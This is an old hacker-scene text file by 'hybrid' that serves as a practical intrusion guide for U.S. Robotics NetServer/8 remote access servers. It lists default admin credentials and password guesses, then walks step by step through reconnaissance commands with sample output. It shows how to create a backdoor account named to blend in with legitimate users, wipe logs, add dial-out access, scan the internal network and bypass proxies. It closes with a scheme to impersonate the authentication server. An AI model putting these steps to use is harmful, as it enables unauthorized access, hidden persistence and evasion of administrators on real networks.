@@ -1,0 +1,871 @@
+U.S. Robotics NetServer/8
+by hybrid (hybrid@dtmf.org)
+(http://hybrid.dtmf.org)
+
+Welcome to my brief article explaining different commands etc on the U.S
+Robotics NetServers which are becomming incresingly popular. These servers
+are an extream sercutity risk to any network that uses them for network
+managment, they essentialy give whoever has administrator access _total_
+control over its surrounding network, after all, the NetServer is designed
+for network managment, I'll go into this in detail in a while. So why am I
+writting this article? -- Well I stumbled accross a website one night which
+featured information on the U.S. Robotics NetServer, the site's content was
+basically braging about the "tough security" of the NetServer, after seeing
+this, and I manageed to stop laughing, I decided to write this file, for
+your enjoyment :)
+
+So lets take a look at the NetServer. You are likely to stumble accross this
+type of system either by the means of dialup modem, or by ip, telnet etc.
+The NetServer will identify itself like this:
+
+Welcome to USRobotics
+ The Intelligent Choice in Information Access
+login:
+
+Note: in most cases admins have made an 'intelligent' choice in choosing this
+server for thier networks, but when it comes to system security, I would
+avoid the phrase 'intelligent' by a mile. The NetServer, like most OSs/
+net amnagment systems, comes with a nice set of factory default logins, which
+in most cases will give whoever has these logins super-user access to the
+network. Hmm, ok (thats _real_ security - well done USRobotics) When loging
+in, the following default accounts will usually get you in:
+
+USER            PASSWORD        ACCESS LEVEL
+----            --------        ------------
+admin           admin           god
+default         default         enough to get god access
+.......         ........        ........................
+manager         manager         god                 } I've only ever seen 
+guest           guest           not good enough       these a few times.
+
+The access that I am going to focus on with this file is the admin access.
+The admin account will nearly all the time exist, so try variations of the
+password, you know, the usuall shit:
+
+admin   manager
+admin   <no pass>      } on some systems I have noticed that finger port
+admin   administrator    (79) is open, and will list a suprising amount of
+admin   root             info about the admin, ie: last name, location etc,
+admin   manage           this would maybee be you're advantage when guessing.
+
+Okee then, you got in. You'll be confronted with somthing a little like this:
+
+NetServer:             } the command line shell. You have several choices,
+                         including <help> or <?>.
+
+Right, here are the choices.
+
+CONNECT                  LOGOUT                   TELNET
+EXIT                     MANAGE
+HELP                     RLOGIN
+
+Very self explanitory, but there are a few things you need to know. To begin
+with, the netserver uses differnt keys to edit.. Command Line Edit:  The
+following options are available:
+--------------
+^a  - start of command   ^b    - left 1 char      ^d - delete char
+^e  - end of command     ^f    - right 1 char     ^n -  next command
+^p  - prev command       ESCb  - left 1 word       ESCf - right 1 word
+<-  - left 1 char        ->    - right 1 char
+up arrow - prev command  down arrow  -  next command
+--------------
+
+The main option you are interested in from the above menu is the MANAGE
+command. Once you have entered the manage session you will be confronted with
+the following command line prompt:
+
+manage: or session: (user definable).. hit <?> you will get the following
+options..
+------------
+ADD                      HANGUP                   RENAME
+ARP                      HELP                     RESET
+ASSIGN                   HIDE                     RESOLVE
+BYE                      HISTORY                  RLOGIN
+COPY                     KILL                     SAVE
+DELETE                   LEAVE                    SET
+DIAL                     LIST                     SHOW
+DISABLE                  LOGOUT                   TELNET
+DO                       PING                     UNASSIGN
+ECHO                     QUIT                     VERIFY
+ENABLE                   REBOOT
+EXIT                     RECONFIGURE
+
+Nice huh? :) right, now I'm going to go into each command in detail, right
+from <add> to <verify> and all the sub-commands.
+
+-----------
+<ADD>
+
+APPLETALK                IP                       SNMP
+DNS                      IPX                      SYSLOG
+FILTER                   LOGIN_HOST               TFTP
+FRAMED_ROUTE             MODEM_GROUP              USER
+INIT_SCRIPT              NETWORK
+------------
+
+The add command is used to upgrade, or add to the current network from which
+the netserver is hosted. For example, you can update DNS server
+configurations/routes/ip designation etc, aswell as link other networks to
+work in synthony with each other. The commands are very self explanitory, and
+will offer help as you go along. A note though: on most systems the log file
+will begin loging everything if it notices a sudden rises in command line
+activity, this is not for security reasons, but more for administration
+debug, you can alter this if you like, or wipe the log file all together,
+more on that in a bit.
+
+When updating/or adding network configurations, the IP formating for the
+netserver is as follows:
+------------
+This field is a IP Host Name or an IP Network Address
+The expected format is Station_Address{/Mask_Specifier}
+The expected format for the address is a.b.c.d
+Each value must be in the range of 0 to 255 decimal.
+The address 127.x.x.x is reserved for Loopback and cannot be specified.
+The Mask Specifier can be in ip address format
+in which case it must be 255.0.0.0 or greater and contiguous
+or 'A', 'B', or 'C'
+or a numeric value from 8 to 30
+describing the number of one bits in the mask
+If this is being used to set a User's IP Address
+The Mask Specifier can also be 'H' (for Host)
+or a numeric value to 32
+
+But before we go and do anything crazy, take a look at the current system
+configuration/setup. Here are the options, turn asci log on for future
+reference (don't be dumb, 3DES ;) ..
+
+session:list<enter>
+CLI - Missing Required Argument(s):
+
+This field is a KEYWORD. The possible values are:
+AARP                     FILTERS                  PROCESSES
+ACTIVE                   INIT_SCRIPTS             SERVICES
+APPLETALK                INTERFACES               SNMP
+AVAILABLE                IP                       SWITCHED
+CONNECTIONS              IPX                      SYSLOGS
+CRITICAL                 LAN                      TCP
+DIAL_OUT                 LOGIN_HOSTS              TFTP
+DNS                      MODEM_GROUPS             UDP
+FACILITIES               NETWORKS                 USERS
+FILES                    PPP
+.....................
+manage:show<enter>
+This field is a KEYWORD. The possible values are:
+ACCOUNTING               DNS                      NETWORK
+APPLETALK                EVENTS                   PPP
+AUTHENTICATION           FILE                     SECURITY_OPTION
+CLEARTCP                 FILTER                   SNMP
+COMMAND                  ICMP                     SYSTEM
+CONFIGURATION            IMODEM                   TCP
+CONNECTION               INTERFACE                TELNET
+CRITICAL_EVENT           IP                       TIME
+DATE                     IPX                      UDP
+DDP                      MEMORY                   USER
+DIAL_OUT                 MODEM_GROUP
+
+As you can see, there are plenty of commands at your dispossal. First, its
+always a good idea to check who else is on the system/server, so we use the
+list connections command, it should look a little like this:
+
+session:list connections<enter>
+
+CONNECTIONS
+IfName    User Name                       Type         DLL
+mod:1     shitface                        DIAL_IN      PPP
+mod:3     admin                           DIAL_IN      NONE <-- you
+..........
+
+The netserver will also have dialout commands, but, this is only using the
+server for somthing lame, its full potential is in the IP routing. To check
+to see if dialout is enabled anyway, just use the <list dialout> command,
+that will tell you what serial pools the modems are connected to. OK then,
+now we are going to focus on configuring an account for ourselves, and
+blending into the user list with stealth. Before hand though, you need as
+much information on the system as possible. So here we go.
+
+session:list dns servers<enter>
+
+DNS NAME SERVERS
+Preference Name                           Address         Status
+1                                         123.111.200.011 ACTIVE
+session
+.............
+
+To gather IP addressing/routing information we can use the following
+commands:
+---------------
+session:list ip<enter>
+CLI - Missing Required Argument(s):
+This field is a KEYWORD. The possible values are:
+ADDRESSES                INTERFACE_BLOCK          ROUTES
+ARP                      NETWORKS
+
+session:list ip addresses<enter>
+
+IP ADDRESSES
+                   Bcast Reassembly
+Address            Algo  Max Size Interface
+127.000.000.001/A  1     3468      loopback
+123.111.164.230/C  1     3468      eth:1
+......
+session:list ip arp<enter>
+
+IP ARP
+IP Address      Phys Address      Type    IfName
+123.111.164.001 00:87:3i:28:24:40 Dynamic eth:1
+123.111.164.179 00:27:ah:01:4f:60 Dynamic eth:1
+......
+session:list ip interface_block<enter>
+
+IP INTERFACE BLOCKS
+
+Address            Neighbor        Status   Interface
+000.000.000.000/H  123.111.164.231 ENABLED   mod:1
+123.111.164.230/C  000.000.000.000 ENABLED   eth:1
+......
+session:list ip networks<enter>
+
+CONFIGURED NETWORKS
+Name                            Prot Int      State Type Network Address
+ip                              IP   eth:1    ENA   STAT 123.111.164.230/C
+IP-loopback                     IP   loopback ENA   AUTO 127.0.0.1/A
+2608159-ip-I3                   IP   mod:1    ENA   DYN  123.111.164.231/H
+......
+session:list ip routes<enter>
+
+IP ROUTES
+Destination        Prot   NextHop         Metric  Interface
+000.000.000.000/0  NetMgr 166.079.164.001 1       eth:1
+127.000.000.000/A  LOCAL  127.000.000.001 1       loopback
+127.000.000.001/H  LOCAL  127.000.000.001 1       loopback
+127.255.255.255/H  LOCAL  127.255.255.255 1       loopback
+123.111.164.000/C  LOCAL  123.111.164.230 1       eth:1
+123.111.164.230/H  LOCAL  123.111.164.230 1       eth:1
+123.111.164.231/H  LOCAL  123.111.164.231 1       mod:1
+123.111.164.255/H  LOCAL  123.111.164.255 1       eth:1
+255.255.255.255/H  LOCAL  255.255.255.255 1       eth:1
+......
+session:list tcp connections<enter>
+
+TCP CONNECTIONS
+Local Address     Local Port  Remote Address    Remote Port Status
+000.000.000.000   23          000.000.000.000   0           Listen
+000.000.000.000   139         000.000.000.000   0           Listen
+000.000.000.000   5000        000.000.000.000   0           Listen
+......
+session:list tftp clients<enter>
+
+TFTP CLIENT ADDRESSES
+123.111.162.15
+......
+session:list udp listeners<enter>
+
+UDP LISTENERS
+Local Address     Port
+000.000.000.000   69
+000.000.000.000   161
+000.000.000.000   520
+000.000.000.000   1645
+000.000.000.000   2049
+000.000.000.000   2050
+000.000.000.000   3000
+......
+
+To get a complete system configuration use the <show config> command:
+
+session:show configuration<enter>
+CONFIGURATION SETTINGS
+
+System Identification:
+     Name: RAS_Sam     Contact: hybrid
+
+Authentication  Remote: ENABLED       Local: ENABLED
+    Primary Server: 123.111.162.159    Secondary Server: 000.000.000.000
+
+Remote Accounting: ENABLED
+    Primary Server: 123.111.162.159    Secondary Server: 000.000.000.000
+
+Interfaces:
+     eth:1
+     loopback
+     mod:1                    mod:2                    mod:3
+     mod:4                    mod:5                    mod:6
+     mod:7                    mod:8
+
+IP  Forwarding: ENABLED       Routing: ENABLED       RIP: ENABLED
+    Dynamic Pool Beginning Address: 123.111.164.231    Size: 8
+    Networks:
+        ip                              ETHERNET_II  eth:1  123.111.164.230/C
+        IP-loopback                     LOOPBACK     loopback127.0.0.1/A
+
+IPX  Default Gateway: 00000000            Maximum Hops: 15
+    Dynamic Pool Beginning Address: 00000000            Members: 0
+
+Appletalk  ARAP: ON      Maximum ARAP Sessions: 8
+
+PPP  Receive Authentication: PAP
+
+DNS  Domain: uber.coffee.co.uk
+     Servers:
+        1                                         123.111.200.11
+...........
+session:show dns<enter>
+
+DNS SETTINGS
+Domain Name:                               uber.coffee.co.uk
+Number Retries per Server:                 1
+Timeout Period in Seconds:                 5
+...........
+
+Now thats enough information you will need about the netserver for the time
+being. There are also a wealth of other commands concerning to listing of
+IP configurations, but those are the more important ones, the next set of
+commands list and show information about the netservers files/architecture
+setup.
+
+-------
+session:list files<enter>
+Appletalk.cfg
+CLI.cfg
+CallInitProcess.cfg
+ConfigProcess.cfg
+DNS.cfg                  } the DNS configuration
+DialOutProcess.cfg
+EventHandler.cfg         you can view the contents of a file by 
+FilterMgr.cfg            using the <show file [file]> command, 
+IPForwarder.cfg          this will only show the contents of a
+IpxProcess.cfg           file if it is in raw ascii. 
+PilgrimStrings.ind
+PilgrimStrings.str
+PppProcess.cfg
+QuickSetup.cfg
+Robo.stats
+RoboExecNMProcess.cfg
+RoboString.ind
+RoboString.str
+SnmpProcess.cfg
+TermProt.cfg
+TftpProcess.cfg
+aaa
+log-file.local
+ns816.bin.z
+old-log-file.local
+user_settings.cfg
+userindex
+users
+wall_1
+...........
+
+OK, now I'm sure you are feed up with reading what commands the netserver has
+it's time to take a look at what it can do, and _how_ you can do it. To begin
+with you need you're own account, not just any account though, you need an
+account that will blend in with the others. Now here is the intersting part,
+when you configure an account, you can specify a set IP for the user you add,
+you can then (using your own box and DNS server) set up your own sub-domains,
+but the cool thing is.. you can configure this all on the netserver.
+
+The netserver has some very advanced options when setting up accounts, you
+can specify that you're IP statistics/routing etc are cloaked and even
+spoofed (internally) If you are configuring an account on a net connected
+netserver, you will be online, and not even exist. (you are behind a multi-
+layer firewall, and you're IP is non-existant)
+
+First things first, its a good idea to get a listing of the current users on
+the network so we can make an account that will blend in with the others, and
+not stick out to much. For this, use the <list users> command.
+----------
+session:list users<enter>
+USERS
+                                Login       Network
+User Name                       Service     Service    Status   Type
+admin                           TELNET  (D) PPP    (D) ACTIVE   LOGIN
+                                                                MANAGE
+shitface                        TELNET  (D) PPP        INACTIVE NETWORK
+default                         TELNET      PPP        INACTIVE NETWORK
+1233333                         TELNET      PPP        INACTIVE NETWORK
+1207706                         TELNET      PPP        INACTIVE NETWORK
+1304708                         TELNET      PPP        INACTIVE NETWORK
+........
+
+As you can see the higher ratio of users have a numerical username, therefore
+when it comes to configuring our own account, we will have a numerical user-
+name aswell -- common sense really. Did you notice that the user 'shitface'
+had a PPP dialin connection before? (show connections).. Well the user
+shitface will have the correct IP/network configurations in order to
+establish a PPP connection. So we need to get more information on the user
+shitface. User the command <show user [username]>
+
+session:show user shitface<enter>
+
+INFORMATION FOR USER: shitface
+Status:                                    INACTIVE
+Type:                                      NETWORK
+Expiration:                                00-   -0000
+Message:
+Callback Type:                             NORMAL
+Phone Number:                              1-800-SCAN-4IT
+Alternate Phone Number:                    1-800-OPERATOR
+Input Filter:
+Output Filter:
+Modem Group:                               all
+Session Timeout                            0
+Idle Timeout:                              0
+PARAMETERS FOR NETWORK USERS:
+Network Service                            PPP
+Header Compression:                        TCPIP        (D)
+MTU:                                       1500
+Send Password:
+Appletalk:                                 ENABLED      (D)
+Appletalk Address Range:                   0 - 0
+Filter Zones                               ENABLED      (D)
+IP Usage:                                  ENABLED
+Address Selection:                         ASSIGN
+Remote IP Address:                         0.0.0.0/H    (D)
+IP Routing:                                NONE
+Default Route Option:                      DISABLED
+IP RIP Routing Protocol:                   RIPV1
+IP RIP Routing Policies:
+                                           SEND_DEFAULT
+                                           SEND_ROUTES
+                                           SEND_SUBNETS
+                                           ACCEPT_DEFAULT
+                                           SILENT
+                                           SPLIT_HORIZON
+                                           POISON_REVERSE
+                                           FLASH_UPDATE
+                                           SEND_COMPAT
+                                           RIPV1_RECEIVE
+                                           RIPV2_RECEIVE
+IP RIP Authentication Key:
+IPX Usage:                                 ENABLED   (D)
+IPX Address:                               0
+IPX Routing:                               RESPOND   (D)
+IPX WAN Usage:                             DISABLED  (D)
+Spoofing:                                  ENABLED
+PARAMETERS for NETWORK PPP USERS
+Max Channels                               1         (D)
+Channel Decrement Percent:                 20        (D)
+Channel Expansion Percent:                 60        (D)
+Expansion Algorithm:                       LINEAR    (D)
+Receive ACC Map:                           0         (D)
+Transmit ACC Map:                          0         (D)
+Compression Algorithm:                     AUTO      (D)
+Compression Reset Mode:                    AUTO      (D)
+Min Compression Size:                      256       (D)
+...........
+
+Now we are going to configure an account for ourselves -- this is nessasary
+so we can establish a good PPP connection and blend in with the other users
+on the network, we can then implement the tools on our own box for mapping
+the internal network, or the darkcyde of the firewall, we can then find all
+the other connected boxes on the network.
+
+So, when we configure our network account we need to consider the following,
+IP usuage, routing, DNS servers, cloaking, spoofing, _stealth_. On a net
+connected netserver you can often use your own specified dns server, but
+the network traffic in the arp tables etc will reveal abnormal network
+activity to a nosey administrator. The best thing to do is use the servers
+internal DNS server, you can later own the DNS server aswell :> Also, if the
+network is firewalled (which will always be the case) Extrenal use of a DNS
+server would arouse susspisions of the administrator(s).
+
+The default settings for PPP access on netservers is standard PPP protocol,
+sometimes the administrator would have enabled CHAP or PAP for login
+authentification, and this will usually be authentificated by another box on
+the network, therefore you are pretty screwed unless you a) own the
+authentification server or b) setup your account for standard PPP login
+authentification. -- the only disadvantage with this would be that the
+account you created would stick out from the others a little more.
+
+Right, time to make the account. In this case, because the majourity of
+account names in the user list are numerical we will create a numerical
+account, yep you guessed it, we will create an account called '31337'...
+
+---------------
+session:add user.... 
+CLI - Missing Required Argument(s):
+This field is a User Name
+        The expected format is an ASCII string.      } options
+        The maximum size is 32 characters
+        This name must be unique.
+...............
+ENABLED                  NETWORK_SERVICE          TYPE
+LOGIN_SERVICE            PASSWORD
+
+You can specify what kind of service you are going to add for yourself, just
+keep it to PPP and telnet for the time being, thats what the other users
+have, so thats what we'll have. Differnet options for type of service
+include:
+
+        CALLBACK
+        DIAL_OUT
+        LOGIN
+        MANAGE
+        NETWORK
+        The types CALLBACK and DIAL_OUT are mutually exclusive.
+
+So now we are ready to add our user.. The command line is as follows:
+-------
+session:add user <31337> login_service telnet password <password>
+-------
+
+Now to check to see if the user 31337 was addded ok, check the user list..
+with the <list users> command
+.....
+31337                         TELNET      PPP    (D) INACTIVE NETWORK(D)
+.....
+
+Right, we got the username there, now we have to activate our capabilitys on
+the network. For this we use the <set> command.
+
+session:set user 31337
+CLI - Missing Required Argument(s):
+
+This field is a KEYWORD. The possible values are:
+ALTERNATE_PHONE_NUMBER   MESSAGE                  SESSION_TIMEOUT
+CALLBACK_TYPE            MODEM_GROUP              TYPE
+EXPIRATION               OUTPUT_FILTER
+IDLE_TIMEOUT             PASSWORD
+INPUT_FILTER             PHONE_NUMBER             } If you are super el8
+                                                    you can add a phone
+                                                    number in your userfile.
+
+Now, this is optional, and not advisable, but if you want to set your own
+IP address (good for subnetting) you can configure your account as follows,
+I think I have also done this so you're IP activitys are not loged in the
+arp cache.
+.......
+session:add framed_route user 31337 ip_route (numerical IP address goes here)
+.......
+
+We also need to enable the user, the command should be somthing like this:
+
+session:set user 31337 type network
+session:set user 31337 type telnet
+session:set user 31337 type ppp
+session:set user 31337 type login
+.......
+
+Now, we have our user setup it's time to test it out. Log out of the system
+<exit> reset modems, then dial back in. this time login as 31337 with your
+chossen password, which by the way for some reason has to be the same length
+as the user account name. Once loged in you should get an automatic PPP
+connection.. enable you're PPP client with the internal specified DNS server
+default routes etc, and there you go.
+
+Test the DNS server by pinging/telneting whatever to a few host[names] You
+now have a secure PPP connection to your host (the USRobotics NetServer) You
+can now begin to take a look at what is on the internal network, It is
+preferable to use a port mapper such as nmap or similar, you will be
+supprised at the boxes you will find connected to the network, as in most
+internal networks you will find SunOS/Solaris boxes, UNIX boxes (the
+netserver is based on unix -- but i forgot to mention that) you will also
+find cisco routers/switches, jet-directs, printers, everything you would
+expect to find on an internal LAN network.
+
+Now we've established out net connection, its time to take a look at the
+further things you can do with the netserver system. If the network has a
+nice amount of modems in the modem serial pool (you can see this in the
+show commands) we can configure our account for dialout aswell. This can be
+done by using the <set user> commands. The best thig to do here is set up a
+seperate account fro dialout only, therefore if the admin notices that
+account you wont loose your access alltogether. Once you have set up your
+seperate account with login_user and dial_out settings, you can then telnet
+back to the netserver (IP obtained via scan --- or the command show system)
+Once telneted back to the netserver you can login with your dialout account
+user name, and then attach to the modem pool an control the modems just as
+you would in a terminal screen, AT etc. You can then dialout whilst you are
+similtaniously online aswell.
+
+As in most OSs, the netserver system operates on a multi-user security access
+level basis. There are differnet levels of access for example,
+
+        admin   --- super-user
+        manager --- manager
+        user123 --- standard user
+        guest   --- guest access
+        default --- default settings
+
+To look at this in more detail, here are the settings for the admin account
+and also the settings for the default accounts:
+
+--------
+session:show user admin<enter>
+
+INFORMATION FOR USER: admin
+Status:                                    ACTIVE
+Type:                                      LOGIN
+                                           MANAGE
+Expiration:                                00-   -0000
+Message:
+Callback Type:                             NORMAL
+Phone Number:
+Alternate Phone Number:
+Input Filter:
+Output Filter:
+Modem Group:                               all    (D)
+Session Timeout                            0
+Idle Timeout:                              0
+PARAMETERS FOR LOGIN USERS:
+Login Service:                             TELNET  (D)
+TCP Port:                                  23    (D)
+Terminal:                                  vt100    (D)
+Login Host:                                000.000.000.000
+Host Type:                                 SELECT
+.......
+session:show user default<enter>
+
+INFORMATION FOR USER: default
+Status:                                    INACTIVE
+Type:                                      NETWORK
+Expiration:                                00-   -0000
+Message:
+Callback Type:                             NORMAL
+Phone Number:
+Alternate Phone Number:
+Input Filter:
+Output Filter:
+Modem Group:                               all
+Session Timeout                            0
+Idle Timeout:                              0
+PARAMETERS FOR NETWORK USERS:
+Network Service                            PPP
+Header Compression:                        TCPIP
+MTU:                                       1514
+Send Password:
+Appletalk:                                 ENABLED
+Appletalk Address Range:                   0 - 0
+Filter Zones                               ENABLED
+IP Usage:                                  ENABLED
+Address Selection:                         ASSIGN
+Remote IP Address:                         0.0.0.0/H
+IP Routing:                                NONE
+Default Route Option:                      DISABLED
+IP RIP Routing Protocol:                   RIPV1
+IP RIP Routing Policies:
+IP RIP Authentication Key:
+IPX Usage:                                 ENABLED
+IPX Address:                               0
+IPX Routing:                               RESPOND
+IPX WAN Usage:                             DISABLED
+Spoofing:                                  DISABLED
+PARAMETERS for NETWORK PPP USERS
+Max Channels                               1
+Channel Decrement Percent:                 20
+Channel Expansion Percent:                 60
+Expansion Algorithm:                       LINEAR
+Receive ACC Map:                           0
+Transmit ACC Map:                          0
+Compression Algorithm:                     AUTO
+Compression Reset Mode:                    AUTO
+Min Compression Size:                      256
+........
+
+You can also see what is going on on the netserver at the time you are on it
+bye issueing the following command:
+
+----------
+session:list processes<enter>
+
+PROCESSES
+Index     Name                     Type           Status
+2001      NameManager              System         Inactive
+12001     Console                  System         Inactive
+22001     FileManager              System         Inactive
+32001     Configurator             Application    Inactive
+42001     Main                     Application    Active
+52001     MIB Registrar            Application    Inactive
+62001     Config File Manager      Application    Inactive
+72001     IP Forwarder             Forwarder      Inactive
+82001     UDP Process              Application    Inactive
+92001     TCP Process              Application    Inactive
+a2001     Telnet                   Application    Inactive
+b2001     SLIP Process             Application    Inactive
+c2001     TFTP Process c2001       Application    Inactive
+d2001     IP Spoofing              Application    Inactive
+e2001     Proxy NetBIOS            Application    Inactive
+f2001     RoboExec NetManagement   Application    Active
+102001    User Manager             Application    Inactive
+112001    SNMP Agent               Application    Inactive
+122001    Event Handler            Application    Inactive
+132001    Point to Point Protocol  Application    Inactive
+142001    Domain Name System       Application    Inactive
+152001    Filter Manager Process   Application    Inactive
+162001    IPX                      Forwarder      Inactive
+172001    IPX RIP                  Application    Inactive
+182001    SAP                      Application    Inactive
+192001    IPX DIAG                 Application    Inactive
+1a2001    IPX NETBIOS              Application    Inactive
+1b2001    IPX SPOOF                Application    Inactive
+1c2001    IPX WAN                  Application    Inactive
+1d2001    AppleTalk Forwarder      Forwarder      Inactive
+1e2001    AppleTalk NBP/ZIP        Application    Inactive
+1f2001    AppleTalk Spoofer        Application    Inactive
+202001    AppleTalk RTMP           Application    Inactive
+212001    AppleTalk ARAP Framing   Application    Inactive
+222001    IPX/IP Dial-out Process  Application    Inactive
+232001    File System Compaction ProcessApplication    Inactive
+242001    Console Driver           Driver         Inactive
+252001    Loopback Driver          Driver         Inactive
+262001    Ethernet Driver          Driver         Inactive
+272001    Modem Port Driver        Driver         Inactive
+282001    Call Init Process        Application    Inactive
+292001    IP Routing Instance      Application    Inactive
+2a2001    CLI                      Application    Inactive
+2b2004    CLI 2b2004               Application    Inactive
+-------------
+
+The commands on the shell interface are fairly self explanitory and all
+offer a limited amount of info in help topics. It appears that on some
+netservers, where server authentification is enabled, if an account is set
+up, the username and login details are automaticaly transfered to the
+authentification server, so any other box on that network connected to the
+authentification server will allow you to login with the username you set
+up on the netserver, nice big security hole for the admins to ponder over.
+
+There are a few obsticles that you may have to overcome if you find such a
+server, exapmple: most netservers are hidden nicley behind firewalls, aswell
+as outgoing packets are sent through proxy servers. Again, you have options
+here, you could a) attempt to get admin on the proxy servers and the
+routers, or b) -- the more favourable option would be to re-configure your
+IP routing in the network setup configuration on the netserver. This means
+you would bypass any proxy/security servers that are present on that network.
+
+An idea I had a while back when dealing with authentification servers is to
+find the the local authentification server on the network, and mirror the
+software/OS etc that the authentification server uses. Lets say the
+authentification server was 123.111.33.6.. (After you have replicated the
+server) -- first temporarily take the server offline in the ip routing
+configuration, then configure a user account with the fixed IP of
+123.111.33.6 (the authentification server).. login as that user when you are
+on the box you set up with the authentification software, the idea is that
+all authentification packets will be sent to your box, effectivly making you
+(the host) the authentification server. It's just an idea anyhow, I've never
+tried it out, but I'm sure somthing like that would work.
+
+Anyhow, thats it for this article, I hope you enjoyed it. Take it easy and
+remeber to visit my website :) --- hybrid.
+
+
+                        --- http://hybrid.dtmf.org ---
+
+hybrid@dtmf.org
+hybrid@ninex.com        
+----------------
+shouts fly out to: [ D4RKCYDE ] [ B4B0 ] [ 9X ] [ PHUNC ] [ DTMF ] [ MED ]
+                   [ zomba ] [ downtime ] [ jasun ] [ substance ] [ tip ]
+                   [ gb ] [ ph1x ] [ jorge ] [ lowtek ] [ wirepair ]
+                   [ psyclone ] [ oeb ] [ siezer ] [ infidel ] [ knight ]
+
++++
+NO CARRIER
+
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: PGPfreeware 5.0i for non-commercial use
+Comment: I Encrypt, Therefore I Am
+
+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
+=f9ac
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+                    ___ ___ _____.___.____________________  ____________
+hybrid@b4b0.org    /   |   \\__  |   |\______   \______   \/_   \______ \
+hybrid@ninex.com  /    ~    \/   |   | |    |  _/|       _/ |   ||    |  \
+hybrid.dtmf.org   \    Y    /\____   | |    |   \|    |   \ |   ||    `   \
+----------------   \___|_  / / ______| |______  /|____|_  / |___/_______  /
+                         \/  \/               \/        \/              \/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                      
+
+
+
+
+
+
+
+
+
+
+
